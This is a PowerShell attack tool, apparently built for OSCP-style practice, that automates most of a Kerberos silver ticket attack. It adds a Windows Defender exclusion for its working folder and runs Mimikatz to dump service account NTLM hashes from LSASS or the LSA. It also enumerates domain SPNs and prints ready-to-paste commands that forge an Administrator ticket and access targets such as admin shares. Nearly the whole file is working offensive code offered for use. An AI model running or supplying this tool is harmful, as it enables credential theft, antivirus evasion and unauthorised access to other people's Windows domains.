#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Silver Ticket Attack Helper - Recon & Command Generator (OSCP Safe)
.DESCRIPTION
    Performs reconnaissance and generates exact commands for manual execution:
    
    Silver Ticket Attack Prerequisites:
    1. SPN password hash (NTLM) - extracted from memory or LSA
    2. Domain SID - auto-detected from current user
    3. Target SPN - enumerated and user-selected
    
    This script automates:
    - Domain & SID detection
    - SPN enumeration (PowerView/setspn/LDAP)
    - Hash extraction via Mimikatz (sekurlsa::logonpasswords)
    - Command generation for manual ticket forging
    
    IMPORTANT: sekurlsa::logonpasswords requires the target service account
    to have an active session on the current machine. If hash extraction fails,
    script will fallback to lsadump::lsa /patch (requires SYSTEM/Domain Admin).
    
    NOTE: Does NOT auto-exploit (OSCP compliant)
.NOTES
    Requires: mimikatz_trunk.zip and Powerview in same folder (auto-extracted)
.EXAMPLE
    powershell -NoProfile -ExecutionPolicy Bypass .\silver_ticket_scanner.ps1
#>

param(
    [string]$MimikatzPath = $null
)

$ErrorActionPreference = "Stop"

# Colors
function Write-Success { param($msg) Write-Host "[+] $msg" -ForegroundColor Green }
function Write-Info { param($msg) Write-Host "[*] $msg" -ForegroundColor Cyan }
function Write-Warn { param($msg) Write-Host "[!] $msg" -ForegroundColor Yellow }
function Write-Fail { param($msg) Write-Host "[-] $msg" -ForegroundColor Red }
function Write-Command { param($msg) Write-Host "[>] $msg" -ForegroundColor DarkGray }

function Initialize-Mimikatz {
    param([string]$CustomPath)
    
    Write-Info "Initializing Mimikatz..."
    
    # Add current directory to Windows Defender exclusion
    try {
        $currentDir = Get-Location | Select-Object -ExpandProperty Path
        Write-Info "Adding exclusion for: $currentDir"
        Write-Command "Add-MpPreference -ExclusionPath $currentDir"
        Add-MpPreference -ExclusionPath $currentDir -ErrorAction SilentlyContinue
        Write-Success "Windows Defender exclusion added"
    } catch {
        Write-Warn "Could not add exclusion: $_"
    }
    
    if ($CustomPath -and (Test-Path $CustomPath)) {
        Write-Success "Using custom Mimikatz path: $CustomPath"
        return $CustomPath
    }
    
    $searchPaths = @(
        ".\mimikatz.exe",
        ".\x64\mimikatz.exe",
        ".\mimikatz\x64\mimikatz.exe",
        ".\Win32\mimikatz.exe"
    )
    
    foreach ($path in $searchPaths) {
        if (Test-Path $path) {
            Write-Success "Found Mimikatz at: $path"
            return (Resolve-Path $path).Path
        }
    }
    
    Write-Warn "Mimikatz.exe not found, checking for mimikatz_trunk.zip..."
    
    $zipFile = ".\mimikatz_trunk.zip"
    if (Test-Path $zipFile) {
        Write-Info "Found mimikatz_trunk.zip, extracting..."
        try {
            Write-Command "Expand-Archive -Path $zipFile -DestinationPath .\mimikatz -Force"
            Expand-Archive -Path $zipFile -DestinationPath ".\mimikatz" -Force
            Write-Success "Extracted mimikatz_trunk.zip"
            
            foreach ($path in $searchPaths) {
                if (Test-Path $path) {
                    Write-Success "Found Mimikatz at: $path"
                    return (Resolve-Path $path).Path
                }
            }
            
            Write-Fail "Extraction completed but mimikatz.exe not found"
            exit 1
        } catch {
            Write-Fail "Failed to extract: $_"
            exit 1
        }
    } else {
        Write-Fail "Mimikatz not found!"
        Write-Info "Please place mimikatz_trunk.zip in current directory"
        exit 1
    }
}

function Test-LocalAdmin {
    Write-Info "Checking local admin privileges..."
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) {
        Write-Fail "Script requires local admin privileges!"
        exit 1
    }
    Write-Success "Running as local admin"
}

function Get-DomainInfo {
    Write-Info "Auto-detecting domain information..."
    
    try {
        Write-Command "Get-WmiObject Win32_ComputerSystem"
        $domain = (Get-WmiObject Win32_ComputerSystem).Domain
        if (-not $domain -or $domain -eq "WORKGROUP") {
            throw "Not joined to a domain"
        }
        Write-Success "Domain: $domain"
        return $domain
    } catch {
        Write-Fail "Failed to detect domain: $_"
        exit 1
    }
}

function Get-DomainSID {
    Write-Info "Auto-detecting Domain SID..."
    
    try {
        Write-Command "whoami /user"
        $whoamiOutput = whoami /user
        $sidLine = $whoamiOutput | Select-String -Pattern "S-1-5-21-[\d-]+"
        if ($sidLine) {
            $fullSID = ($sidLine -split '\s+')[-1]
            $domainSID = $fullSID -replace '-[^-]+$',''
            Write-Success "Domain SID: $domainSID"
            return $domainSID
        } else {
            throw "Could not parse SID from whoami output"
        }
    } catch {
        Write-Fail "Failed to get Domain SID: $_"
        exit 1
    }
}

function Get-AllSPNs {
    param([string]$Domain)
    
    Write-Info "Enumerating all SPNs in domain..."
    Write-Info "This may take a moment..."
    
    try {
        $spnList = @()
        
        # Method 1: Try PowerView first
        $powerViewPath = ".\PowerView.ps1"
        if (Test-Path $powerViewPath) {
            Write-Info "Found PowerView.ps1, using it for enumeration..."
            try {
                Write-Command "Import-Module .\PowerView.ps1 -Force"
                Import-Module $powerViewPath -Force -ErrorAction Stop
                Write-Command "Get-DomainUser -SPN"
                $users = Get-DomainUser -SPN -ErrorAction Stop
                
                foreach ($user in $users) {
                    if ($user.serviceprincipalname) {
                        $account = $user.samaccountname
                        foreach ($spn in $user.serviceprincipalname) {
                            $spnList += [PSCustomObject]@{
                                Account = $account
                                SPN = $spn
                                ServiceType = ($spn -split '/')[0]
                            }
                        }
                    }
                }
                
                if ($spnList.Count -gt 0) {
                    Write-Success "PowerView found $($spnList.Count) SPNs"
                    return $spnList
                }
            } catch {
                Write-Warn "PowerView failed: $_"
                Write-Info "Falling back to setspn..."
            }
        }
        
        # Method 2: Using setspn
        Write-Command "setspn -T $Domain -Q */*"
        $setspnOutput = setspn -T $Domain -Q */* 2>&1
        
        $currentAccount = $null
        
        foreach ($line in $setspnOutput) {
            if ($line -match '^CN=([^]+)') {
                $currentAccount = $matches[1]
            } elseif ($line -match '^\s+([^\s]+/.+)$' -and $currentAccount) {
                $spn = $matches[1].Trim()
                $spnList += [PSCustomObject]@{
                    Account = $currentAccount
                    SPN = $spn
                    ServiceType = ($spn -split '/')[0]
                }
            }
        }
        
        if ($spnList.Count -eq 0) {
            Write-Warn "No SPNs found via setspn, trying LDAP query..."
            
            # Method 3: LDAP query
            Write-Command "DirectorySearcher with filter (servicePrincipalName=*)"
            $searcher = New-Object DirectoryServices.DirectorySearcher
            $searcher.Filter = "(servicePrincipalName=*)"
            $searcher.PropertiesToLoad.Add("servicePrincipalName") | Out-Null
            $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
            
            $results = $searcher.FindAll()
            foreach ($result in $results) {
                $account = $result.Properties["samaccountname"][0]
                foreach ($spn in $result.Properties["serviceprincipalname"]) {
                    $spnList += [PSCustomObject]@{
                        Account = $account
                        SPN = $spn
                        ServiceType = ($spn -split '/')[0]
                    }
                }
            }
        }
        
        if ($spnList.Count -eq 0) {
            Write-Fail "No SPNs found in domain!"
            exit 1
        }
        
        Write-Success "Found $($spnList.Count) SPNs"
        return $spnList
        
    } catch {
        Write-Fail "Failed to enumerate SPNs: $_"
        exit 1
    }
}

function Show-SPNMenu {
    param([array]$SPNs)
    
    Write-Host ""
    Write-Host "=== Available SPNs ===" -ForegroundColor Yellow
    Write-Host ""
    
    $grouped = $SPNs | Group-Object ServiceType | Sort-Object Name
    
    $index = 1
    $indexMap = @{}
    
    foreach ($group in $grouped) {
        Write-Host "[$($group.Name)]" -ForegroundColor Magenta
        foreach ($spn in $group.Group) {
            Write-Host "  $index. $($spn.SPN)" -ForegroundColor White
            Write-Host "     Account: $($spn.Account)" -ForegroundColor Gray
            $indexMap[$index] = $spn
            $index++
        }
        Write-Host ""
    }
    
    return $indexMap
}

function Select-TargetSPN {
    param([array]$SPNs)
    
    $indexMap = Show-SPNMenu -SPNs $SPNs
    
    do {
        Write-Host "Select target SPN number (1-$($indexMap.Count)): " -NoNewline -ForegroundColor Yellow
        $selection = Read-Host
        
        if ($selection -match '^\d+$' -and [int]$selection -ge 1 -and [int]$selection -le $indexMap.Count) {
            $target = $indexMap[[int]$selection]
            Write-Success "Selected: $($target.SPN) (Account: $($target.Account))"
            return $target
        } else {
            Write-Warn "Invalid selection. Please enter a number between 1 and $($indexMap.Count)"
        }
    } while ($true)
}

function Test-PatchStatus {
    Write-Info "Checking for KB5008380 patch (PAC validation)..."
    
    try {
        Write-Command "Get-HotFix -Id KB5008380"
        $patch = Get-HotFix -Id KB5008380 -ErrorAction SilentlyContinue
        if ($patch) {
            Write-Warn "KB5008380 is installed - PAC validation may be enforced"
            Write-Warn "Silver ticket may fail against patched systems"
            return $false
        } else {
            Write-Success "KB5008380 not found - system may be vulnerable"
            return $true
        }
    } catch {
        Write-Info "Could not verify patch status"
        return $true
    }
}

function Invoke-MimikatzDump {
    param(
        [string]$MimikatzPath,
        [string]$TargetAccount
    )
    
    Write-Info "Dumping service account hash via Mimikatz..."
    
    if (-not (Test-Path $MimikatzPath)) {
        Write-Fail "Mimikatz not found at: $MimikatzPath"
        exit 1
    }
    
    try {
        $mimikatzCmd = "privilege::debug sekurlsa::logonpasswords exit"
        Write-Command "$MimikatzPath privilege::debug sekurlsa::logonpasswords exit"
        $output = & $MimikatzPath "privilege::debug" "sekurlsa::logonpasswords" "exit" 2>&1 | Out-String
        
        $lines = $output -split "`n"
        $inTargetSection = $false
        $ntlmHash = $null
        
        for ($i = 0; $i -lt $lines.Count; $i++) {
            $line = $lines[$i]
            
            # Look for "User Name" (with space) in sekurlsa output
            if ($line -match "User Name\s*:\s*$TargetAccount\s*$" -or $line -match "Username\s*:\s*$TargetAccount\s*$") {
                $inTargetSection = $true
                Write-Info "Found account section for $TargetAccount"
            }
            
            # Extract NTLM hash from target section
            if ($inTargetSection -and $line -match "\*\s*NTLM\s*:\s*([a-fA-F0-9]{32})") {
                $ntlmHash = $matches[1]
                Write-Success "Extracted NTLM hash: $ntlmHash"
                break
            }
            
            # Reset if we hit next authentication section
            if ($inTargetSection -and $line -match "^Authentication Id\s*:") {
                if ($line -notmatch $TargetAccount) {
                    $inTargetSection = $false
                }
            }
        }
        
        if (-not $ntlmHash) {
            Write-Warn "Could not extract NTLM hash for $TargetAccount using sekurlsa::logonpasswords"
            Write-Host ""
            Write-Host "[!] POSSIBLE REASONS:" -ForegroundColor Yellow
            Write-Host "    1. Service account '$TargetAccount' has NO active session on this machine" -ForegroundColor Gray
            Write-Host "    2. Account is not currently logged on" -ForegroundColor Gray
            Write-Host ""
            Write-Host "[*] SOLUTIONS:" -ForegroundColor Cyan
            Write-Host "    Option A: Find another machine where $TargetAccount has an active session" -ForegroundColor Gray
            Write-Host "    Option B: Use lsadump::lsa /patch (requires SYSTEM or Domain Admin privileges)" -ForegroundColor Gray
            Write-Host ""
            
            # Ask user if they want to try lsadump::lsa /patch
            Write-Host "Do you want to try lsadump::lsa /patch? (y/n): " -NoNewline -ForegroundColor Yellow
            $response = Read-Host
            
            if ($response -match '^[Yy]') {
                Write-Info "Attempting lsadump::lsa /patch (may require elevated privileges)..."
                Write-Command "$MimikatzPath privilege::debug lsadump::lsa /patch exit"
                $output = & $MimikatzPath "privilege::debug" "lsadump::lsa /patch" "exit" 2>&1 | Out-String
                
                # Parse lsadump output (different format)
                $lines = $output -split "`n"
                $inTargetSection = $false
                
                for ($i = 0; $i -lt $lines.Count; $i++) {
                    $line = $lines[$i]
                    
                    # Look for "User : TARGET_ACCOUNT" or "Account : TARGET_ACCOUNT"
                    if ($line -match "User\s*:\s*$TargetAccount\s*$" -or $line -match "Account\s*:\s*$TargetAccount\s*$") {
                        $inTargetSection = $true
                        Write-Info "Found account section for $TargetAccount in lsadump output"
                    }
                    
                    # Extract NTLM hash
                    if ($inTargetSection -and $line -match "NTLM\s*:\s*([a-fA-F0-9]{32})") {
                        $ntlmHash = $matches[1]
                        Write-Success "Extracted NTLM hash via lsadump: $ntlmHash"
                        break
                    }
                    
                    # Reset section
                    if ($inTargetSection -and ($line -match "^\s*User\s*:" -or $line -match "^\s*RID\s*:")) {
                        if ($line -notmatch $TargetAccount) {
                            $inTargetSection = $false
                        }
                    }
                }
                
                if (-not $ntlmHash) {
                    Write-Fail "Could not extract NTLM hash using lsadump::lsa /patch either"
                    Write-Info "Full Mimikatz output:"
                    Write-Host $output
                    exit 1
                }
            } else {
                Write-Fail "Cannot proceed without NTLM hash"
                Write-Info "Please run this script on a machine where $TargetAccount has an active session"
                exit 1
            }
        }
        
        return $ntlmHash
        
    } catch {
        Write-Fail "Mimikatz execution failed: $_"
        exit 1
    }
}

function Show-AttackSummary {
    param(
        [string]$MimikatzPath,
        [string]$Domain,
        [string]$DomainSID,
        [string]$TargetSPN,
        [string]$ServiceAccount,
        [string]$NTLMHash,
        [bool]$IsVulnerable
    )
    
    $serviceType = ($TargetSPN -split '/')[0]
    $targetHost = ($TargetSPN -split '/')[1] -replace ':[0-9]+$',''
    
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "  SILVER TICKET ATTACK SUMMARY" -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host ""
    
    Write-Host "[RECON RESULTS]" -ForegroundColor Yellow
    Write-Host "  Domain:          $Domain" -ForegroundColor White
    Write-Host "  Domain SID:      $DomainSID" -ForegroundColor White
    Write-Host "  Target SPN:      $TargetSPN" -ForegroundColor White
    Write-Host "  Service Type:    $serviceType" -ForegroundColor White
    Write-Host "  Target Host:     $targetHost" -ForegroundColor White
    Write-Host "  Service Account: $ServiceAccount" -ForegroundColor White
    Write-Host "  NTLM Hash:       $NTLMHash" -ForegroundColor White
    Write-Host ""
    
    if ($IsVulnerable) {
        Write-Host "[VULNERABILITY STATUS]" -ForegroundColor Green
        Write-Host "  ✓ System appears VULNERABLE to Silver Ticket attack" -ForegroundColor Green
        Write-Host "  ✓ KB5008380 patch NOT detected" -ForegroundColor Green
        Write-Host ""
    } else {
        Write-Host "[VULNERABILITY STATUS]" -ForegroundColor Yellow
        Write-Host "  ! KB5008380 patch detected - attack may fail" -ForegroundColor Yellow
        Write-Host "  ! Proceed with caution" -ForegroundColor Yellow
        Write-Host ""
    }
    
    Write-Host "[MANUAL ATTACK STEPS]" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Step 1: Forge Silver Ticket with Mimikatz" -ForegroundColor Yellow
    Write-Host ""
    
    $mimikatzCommand = "kerberos::golden /sid:$DomainSID /domain:$Domain /ptt /target:$targetHost /service:$serviceType /rc4:$NTLMHash /user:Administrator"
    
    Write-Host "Run Mimikatz:" -ForegroundColor Cyan
    Write-Host "  $MimikatzPath" -ForegroundColor White
    Write-Host ""
    Write-Host "Then execute this command in Mimikatz:" -ForegroundColor Cyan
    Write-Host "  mimikatz # $mimikatzCommand" -ForegroundColor Green
    Write-Host ""
    
    Write-Host "Step 2: Verify Ticket" -ForegroundColor Yellow
    Write-Host "  klist" -ForegroundColor White
    Write-Host ""
    
    Write-Host "Step 3: Test Access" -ForegroundColor Yellow
    
    switch ($serviceType.ToUpper()) {
        "HTTP" { 
            Write-Host "  iwr -UseDefaultCredentials http://$targetHost" -ForegroundColor White
        }
        "CIFS" {
            Write-Host "  dir \\\\$targetHost\\C$" -ForegroundColor White
        }
        "MSSQL" {
            Write-Host "  Connect with SQL client to: $targetHost" -ForegroundColor White
        }
        "LDAP" {
            Write-Host "  Run LDAP queries against: $targetHost" -ForegroundColor White
        }
        default {
            Write-Host "  Test access to: $TargetSPN" -ForegroundColor White
        }
    }
    
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host ""
    
    # Copy commands to clipboard friendly format
    Write-Host "[COPY-PASTE READY COMMANDS]" -ForegroundColor Magenta
    Write-Host ""
    Write-Host "# 1. Run Mimikatz (paste inside mimikatz.exe):" -ForegroundColor Yellow
    Write-Host $mimikatzCommand -ForegroundColor Green
    Write-Host ""
    Write-Host "# 2. Verify ticket (PowerShell):" -ForegroundColor Yellow
    Write-Host "klist" -ForegroundColor Green
    Write-Host ""
    Write-Host "# 3. Test access (PowerShell):" -ForegroundColor Yellow
    
    switch ($serviceType.ToUpper()) {
        "HTTP" { 
            Write-Host "iwr -UseDefaultCredentials http://$targetHost" -ForegroundColor Green
        }
        "CIFS" {
            Write-Host "dir \\\\$targetHost\\C$" -ForegroundColor Green
        }
        default {
            Write-Host "# Manual testing required for $serviceType" -ForegroundColor Green
        }
    }
    
    Write-Host ""
}

# ==========================================
# MAIN EXECUTION
# ==========================================

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Silver Ticket Attack Helper" -ForegroundColor Cyan
Write-Host "  RECON MODE (OSCP Safe)" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# Step 0: Check local admin
Test-LocalAdmin

# Initialize Mimikatz
$MimikatzPath = Initialize-Mimikatz -CustomPath $MimikatzPath

# Step 1: Auto-detect domain
$domain = Get-DomainInfo

# Step 2: Enumerate SPNs
$spns = Get-AllSPNs -Domain $domain

# Step 3: User selects target
$target = Select-TargetSPN -SPNs $spns

# Step 4: Check patch status
$isVulnerable = Test-PatchStatus

# Step 5: Auto-detect Domain SID
$domainSID = Get-DomainSID

# Step 6: Dump hash with Mimikatz
$ntlmHash = Invoke-MimikatzDump -MimikatzPath $MimikatzPath -TargetAccount $target.Account

# Step 7: Show attack summary and manual commands
Show-AttackSummary -MimikatzPath $MimikatzPath -Domain $domain -DomainSID $domainSID -TargetSPN $target.SPN -ServiceAccount $target.Account -NTLMHash $ntlmHash -IsVulnerable $isVulnerable

Write-Success "Reconnaissance complete! Follow the manual steps above."
Write-Host ""
